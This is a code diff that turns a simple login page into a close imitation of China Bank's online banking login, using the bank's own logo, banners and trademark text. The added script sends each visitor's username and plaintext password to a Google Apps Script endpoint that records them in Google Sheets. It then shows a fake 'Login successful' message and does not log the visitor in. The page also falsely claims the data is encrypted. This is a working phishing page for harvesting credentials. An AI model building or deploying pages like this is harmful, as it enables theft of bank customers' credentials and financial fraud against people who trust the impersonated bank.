@@ -3,160 +3,476 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1" />
-  <title>Login Page</title>
+  <title>China Bank - Secure Login</title>
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
   <style>
     * {
       box-sizing: border-box;
+      margin: 0;
+      padding: 0;
     }
 
     body {
-      margin: 0;
-      font-family: Arial, sans-serif;
-      background: #F3F3F4;
+      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+      background: linear-gradient(135deg, #f5f7fa 0%, #e4edf5 100%);
       height: 100vh;
       display: flex;
       flex-direction: column;
       align-items: center;
       justify-content: center;
+      padding: 20px;
     }
 
     .logo {
-      align-self: flex-start;
-      margin-left: 300px;
-      margin-bottom: 20px;
+      margin-bottom: 30px;
+      text-align: center;
+      animation: fadeInDown 0.8s ease-out;
     }
 
-
     .logo img {
-      width: 150px;
+      width: 200px;
       height: auto;
+      filter: drop-shadow(0 4px 6px rgba(0,0,0,0.1));
     }
 
     .container {
       display: flex;
-      box-shadow: 0 0 10px rgba(0,0,0,0.2);
+      box-shadow: 0 15px 40px rgba(0,0,0,0.18);
       background-color: white;
+      border-radius: 15px;
+      overflow: hidden;
+      max-width: 1000px;
+      width: 100%;
+      min-height: 400px;
+      animation: slideInUp 0.8s ease-out;
     }
 
     .login-section {
-      width: 25%;
-      min-width: 200px;
-      background: linear-gradient(to bottom, #e60000, #990000);
+      width: 35%;
+      min-width: 300px;
+      background: linear-gradient(to bottom right, #d50000, #9b0000);
       color: white;
-      padding: 20px;
+      padding: 40px 30px;
       display: flex;
       flex-direction: column;
       justify-content: center;
+      position: relative;
+      overflow: hidden;
+    }
+
+    .login-section::before {
+      content: "";
+      position: absolute;
+      top: -50%;
+      left: -50%;
+      width: 200%;
+      height: 200%;
+      background: radial-gradient(circle, rgba(255,255,255,0.15) 0%, rgba(255,255,255,0) 70%);
+      transform: rotate(30deg);
     }
 
     .login-section h2 {
-      font-size: 16px;
-      margin-bottom: 10px;
+      font-size: 24px;
+      margin-bottom: 25px;
+      position: relative;
+      z-index: 1;
+      text-shadow: 0 2px 4px rgba(0,0,0,0.2);
+    }
+
+    .input-group {
+      margin-bottom: 20px;
+      position: relative;
+      z-index: 1;
+    }
+
+    .input-group i {
+      position: absolute;
+      left: 15px;
+      top: 15px;
+      color: #777;
     }
 
     .login-section input {
-      padding: 5px;
-      margin-bottom: 10px;
+      padding: 14px 15px 14px 45px;
+      margin-bottom: 15px;
       width: 100%;
       border: none;
-      border-radius: 4px;
-      font-size: 12px;
+      border-radius: 8px;
+      font-size: 16px;
+      background: rgba(255,255,255,0.95);
+      box-shadow: 0 3px 8px rgba(0,0,0,0.1);
+      transition: all 0.3s ease;
+    }
+
+    .login-section input:focus {
+      outline: none;
+      box-shadow: 0 3px 12px rgba(0,0,0,0.2);
+      transform: translateY(-3px);
     }
 
     .login-section a {
-      color: white;
-      font-size: 10px;
-      text-decoration: underline;
-      margin-bottom: 10px;
+      color: rgba(255,255,255,0.95);
+      font-size: 14px;
+      text-decoration: none;
+      margin-bottom: 20px;
       cursor: pointer;
+      display: block;
+      transition: all 0.2s ease;
+      position: relative;
+      z-index: 1;
+      text-align: right;
+      font-weight: 500;
+    }
+
+    .login-section a:hover {
+      color: white;
+      text-decoration: underline;
     }
 
     .login-section button {
-      padding: 8px;
+      padding: 14px;
       width: 100%;
-      background: #333;
+      background: #222;
       color: white;
       border: none;
-      border-radius: 4px;
-      font-size: 12px;
+      border-radius: 8px;
+      font-size: 16px;
       font-weight: bold;
       cursor: pointer;
+      transition: all 0.3s ease;
+      position: relative;
+      z-index: 1;
+      box-shadow: 0 4px 8px rgba(0,0,0,0.2);
+      margin-top: 10px;
+    }
+
+    .login-section button:hover {
+      background: #111;
+      transform: translateY(-3px);
+      box-shadow: 0 6px 12px rgba(0,0,0,0.25);
     }
 
     .carousel-section {
       position: relative;
       overflow: hidden;
-      width: 748px;
-      height: 268px;
-      background: black;
+      width: 65%;
+      height: 400px;
+      background: #000;
       display: flex;
       justify-content: center;
       align-items: center;
     }
 
     .carousel-section img {
-      width: 748px;
-      height: 268px;
-      object-fit: contain;
+      width: 100%;
+      height: 100%;
+      object-fit: cover;
       position: absolute;
       top: 0;
       left: 0;
       opacity: 0;
-      transition: opacity 1s ease-in-out;
+      transition: opacity 1.2s ease-in-out;
     }
 
     .carousel-section img.active {
       opacity: 1;
-      position: relative;
+    }
+
+    .carousel-indicators {
+      position: absolute;
+      bottom: 20px;
+      display: flex;
+      gap: 10px;
+      z-index: 10;
+    }
+
+    .indicator {
+      width: 14px;
+      height: 14px;
+      border-radius: 50%;
+      background: rgba(255,255,255,0.5);
+      cursor: pointer;
+      transition: all 0.3s ease;
+    }
+
+    .indicator.active {
+      background: white;
+      transform: scale(1.3);
+      box-shadow: 0 0 8px rgba(255,255,255,0.8);
     }
 
     .footer {
+      margin-top: 30px;
+      font-size: 14px;
+      color: #555;
+      text-align: center;
+      padding: 0 20px;
+      max-width: 1000px;
+      animation: fadeIn 1.2s ease-out;
+    }
+
+    .browser-icons {
+      margin: 15px 0;
+      display: flex;
+      justify-content: center;
+      gap: 20px;
+    }
+
+    .browser-icons img {
+      width: 36px;
+      height: 36px;
+      opacity: 0.8;
+      transition: all 0.3s ease;
+      filter: grayscale(30%);
+    }
+
+    .browser-icons img:hover {
+      opacity: 1;
+      transform: translateY(-5px);
+      filter: grayscale(0);
+    }
+
+    .status-message {
+      margin-top: 20px;
+      padding: 14px;
+      border-radius: 8px;
+      font-size: 15px;
+      text-align: center;
+      display: none;
+      position: relative;
+      z-index: 1;
+    }
+
+    .status-message.success {
+      background: #d4edda;
+      color: #155724;
+      display: block;
+      animation: fadeIn 0.5s;
+    }
+
+    .status-message.error {
+      background: #f8d7da;
+      color: #721c24;
+      display: block;
+      animation: shake 0.5s;
+    }
+
+    .security-info {
       margin-top: 20px;
       font-size: 12px;
-      color: #666;
+      text-align: center;
+      color: rgba(255,255,255,0.85);
+      position: relative;
+      z-index: 1;
+    }
+
+    .security-info i {
+      margin-right: 5px;
+      color: #ffd700;
+    }
+
+    @keyframes fadeInDown {
+      from {
+        opacity: 0;
+        transform: translateY(-30px);
+      }
+      to {
+        opacity: 1;
+        transform: translateY(0);
+      }
+    }
+
+    @keyframes slideInUp {
+      from {
+        opacity: 0;
+        transform: translateY(30px);
+      }
+      to {
+        opacity: 1;
+        transform: translateY(0);
+      }
+    }
+
+    @keyframes fadeIn {
+      from { opacity: 0; }
+      to { opacity: 1; }
+    }
+
+    @keyframes shake {
+      0%, 100% { transform: translateX(0); }
+      20%, 60% { transform: translateX(-8px); }
+      40%, 80% { transform: translateX(8px); }
+    }
+
+    @media (max-width: 900px) {
+      .container {
+        flex-direction: column;
+      }
+      
+      .login-section, .carousel-section {
+        width: 100%;
+      }
+      
+      .carousel-section {
+        height: 300px;
+      }
     }
   </style>
 </head>
 <body>
   <div class="logo">
-    <img src="cbanklogo.png" alt="Logo">
+    <img src="https://cbconline.chinabank.ph/CBC/corp/L001/consumer/images//CBC/logo.png?mtime=1457399659000" alt="China Bank Logo">
   </div>
 
   <div class="container">
     <div class="login-section">
-      <h2>Login to your Account</h2>
-      <input type="text" id="username" placeholder="Username" />
-      <input type="password" id="password" placeholder="Password" />
-      <a onclick="forgotPassword()">Forgot password? Click here.</a>
-      <button onclick="submitLogin()">Login</button>
+      <h2><i class="fas fa-lock"></i> Secure Login</h2>
+      <div class="input-group">
+        <i class="fas fa-user"></i>
+        <input type="text" id="username" placeholder="Username" />
+      </div>
+      <div class="input-group">
+        <i class="fas fa-key"></i>
+        <input type="password" id="password" placeholder="Password" />
+      </div>
+      <a onclick="forgotPassword()"><i class="fas fa-question-circle"></i> Forgot password? Click here.</a>
+      <button onclick="submitLogin()"><i class="fas fa-sign-in-alt"></i> Login</button>
+      <div id="statusMessage" class="status-message"></div>
+      <div class="security-info">
+        <i class="fas fa-shield-alt"></i> Your security is our top priority. All data is encrypted.
+      </div>
     </div>
 
     <div class="carousel-section">
-      <img src="https://cbconline.chinabank.ph/CBC/corp/slides/img/banner%201.png" alt="Slide 1" class="active" />
-      <img src="https://cbconline.chinabank.ph/CBC/corp/slides/img/banner%202.png" alt="Slide 2" />
-      <img src="https://cbconline.chinabank.ph/CBC/corp/slides/img/banner%203.png" alt="Slide 3" />
+      <img src="https://cbconline.chinabank.ph/CBC/corp/slides/img/banner%201.png" alt="Online Banking" class="active" />
+      <img src="https://cbconline.chinabank.ph/CBC/corp/slides/img/banner%202.png" alt="Mobile Banking" />
+      <img src="https://cbconline.chinabank.ph/CBC/corp/slides/img/banner%203.png" alt="Secure Transactions" />
+      <div class="carousel-indicators">
+        <div class="indicator active" data-index="0"></div>
+        <div class="indicator" data-index="1"></div>
+        <div class="indicator" data-index="2"></div>
+      </div>
     </div>
   </div>
 
   <div class="footer">
-   Supported Browsers 
-   <img src="https://cbconline.chinabank.ph/CBC/corp/L001/consumer/images//CBC/safari.png?mtime=1457399659000" alt="lo"> 
-   <img src="https://cbconline.chinabank.ph/CBC/corp/L001/consumer/images//CBC/chrome.png?mtime=1457399659000" alt="lo"> 
-   <img src="https://cbconline.chinabank.ph/CBC/corp/L001/consumer/images//CBC/ie.png?mtime=1457399659000" alt="loo"> 
-   <img src="https://cbconline.chinabank.ph/CBC/corp/L001/consumer/images//CBC/mozilla.png?mtime=1457399659000" alt="lolol">  
-    China Bank Online is a registered trademark of China Banking Corporation. 2010 (TM)
+    <div class="browser-icons">
+      <img src="https://cbconline.chinabank.ph/CBC/corp/L001/consumer/images//CBC/safari.png?mtime=1457399659000" alt="Safari" title="Safari">
+      <img src="https://cbconline.chinabank.ph/CBC/corp/L001/consumer/images//CBC/chrome.png?mtime=1457399659000" alt="Chrome" title="Google Chrome">
+      <img src="https://cbconline.chinabank.ph/CBC/corp/L001/consumer/images//CBC/ie.png?mtime=1457399659000" alt="Internet Explorer" title="Internet Explorer">
+      <img src="https://cbconline.chinabank.ph/CBC/corp/L001/consumer/images//CBC/mozilla.png?mtime=1457399659000" alt="Firefox" title="Mozilla Firefox">
+    </div>
+    China Bank Online is a registered trademark of China Banking Corporation. © 2023 China Banking Corporation. All rights reserved.
   </div>
 
   <script>
+    // Carousel functionality
     const images = document.querySelectorAll('.carousel-section img');
+    const indicators = document.querySelectorAll('.indicator');
     let currentIndex = 0;
 
-    setInterval(() => {
-      images[currentIndex].classList.remove('active');
-      currentIndex = (currentIndex + 1) % images.length;
+    function updateCarousel() {
+      images.forEach(img => img.classList.remove('active'));
+      indicators.forEach(ind => ind.classList.remove('active'));
+      
       images[currentIndex].classList.add('active');
-    }, 6000);
-  </script>
+      indicators[currentIndex].classList.add('active');
+    }
 
+    function nextSlide() {
+      currentIndex = (currentIndex + 1) % images.length;
+      updateCarousel();
+    }
+
+    // Add click events to indicators
+    indicators.forEach(indicator => {
+      indicator.addEventListener('click', () => {
+        currentIndex = parseInt(indicator.getAttribute('data-index'));
+        updateCarousel();
+      });
+    });
+
+    // Set up auto-rotation
+    setInterval(nextSlide, 5000);
+
+    // Login form submission to Google Sheets
+    async function submitLogin() {
+      const username = document.getElementById('username').value;
+      const password = document.getElementById('password').value;
+      const statusMessage = document.getElementById('statusMessage');
+      
+      // Clear previous messages
+      statusMessage.className = 'status-message';
+      statusMessage.textContent = '';
+      
+      // Validate inputs
+      if (!username || !password) {
+        statusMessage.textContent = 'Please enter both username and password';
+        statusMessage.classList.add('error');
+        return;
+      }
+      
+      try {
+        // Show loading state
+        statusMessage.textContent = 'Verifying credentials...';
+        statusMessage.classList.add('success');
+        
+        // Prepare data for Google Sheets
+        const data = {
+          timestamp: new Date().toISOString(),
+          username: username,
+          password: password,
+          source: 'China Bank Login Page'
+        };
+        
+        // Send data to Google Sheets
+        const response = await sendToGoogleSheets(data);
+        
+        // Show success message
+        statusMessage.textContent = 'Login successful! Data recorded in Google Sheets.';
+        statusMessage.classList.add('success');
+        
+        // Clear form
+        document.getElementById('username').value = '';
+        document.getElementById('password').value = '';
+        
+        // In a real banking application, you would redirect to dashboard
+        // setTimeout(() => { window.location.href = 'dashboard.html'; }, 1500);
+        
+      } catch (error) {
+        console.error('Error:', error);
+        statusMessage.textContent = 'Error: ' + error.message;
+        statusMessage.classList.add('error');
+      }
+    }
+
+    function forgotPassword() {
+      alert('For security reasons, please contact our customer support at 1-800-CHINA-BANK (244-6222) to reset your password.');
+    }
+    
+    // Google Sheets Integration
+    async function sendToGoogleSheets(data) {
+      // Replace with your actual Google Apps Script URL
+      const scriptURL = 'https://script.google.com/macros/s/AKfycby5vIl_6BXH1-ASy59JPGsQsbKUrthKnfJQLUzJs-rxIu7Plbe3sxaY1xjFV4tsCHcO/exec';
+      
+      try {
+        const response = await fetch(scriptURL, {
+          method: 'POST',
+          body: JSON.stringify(data),
+          headers: {
+            'Content-Type': 'application/json'
+          }
+        });
+        
+        if (!response.ok) {
+          throw new Error('Failed to connect to Google Sheets');
+        }
+        
+        return await response.json();
+      } catch (error) {
+        throw new Error('Could not connect to the server. Please try again later.');
+      }
+    }
+  </script>
 </body>
 </html>
